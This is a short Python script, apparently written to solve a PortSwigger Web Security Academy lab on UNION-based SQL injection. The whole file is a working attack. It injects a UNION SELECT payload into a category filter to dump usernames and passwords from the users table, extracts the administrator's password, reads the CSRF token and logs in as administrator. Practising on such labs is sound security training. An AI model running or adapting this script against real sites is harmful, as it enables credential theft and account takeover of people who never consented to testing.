"""
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

category_string = f"' UNION SELECT username,password from users -- "
url = f'https://{site}/filter?category={category_string}'
resp = s.get(url)

soup = BeautifulSoup(resp.text,'html.parser')
user_table = soup.find('table').find_all('tr')
admin_entry = [r.find('td').contents for r in user_table if 'administrator' in r.find('th')]
admin_password = admin_entry.pop().pop()

url = f'https://{site}/login'

resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : 'administrator',
    'password' : admin_password
}

resp = s.post(url, data=logindata)